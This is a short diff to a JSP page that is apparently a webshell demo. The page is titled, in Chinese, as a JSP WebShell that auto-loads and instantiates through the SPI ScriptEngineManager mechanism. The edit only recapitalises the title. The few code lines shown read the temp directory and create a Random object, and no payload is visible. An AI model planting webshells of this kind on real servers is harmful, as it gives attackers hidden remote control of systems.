@@ -10,7 +10,7 @@
 <%@ page import="java.util.Iterator" %>
 <html>
 <body>
-<h2>SPI机制的ScriptEngineManager自动加载实例化JSP Webshell</h2>
+<h2>SPI机制的ScriptEngineManager自动加载实例化JSP WebShell</h2>
 <%
     String tmp = System.getProperty("java.io.tmpdir");
     Random random = new Random();
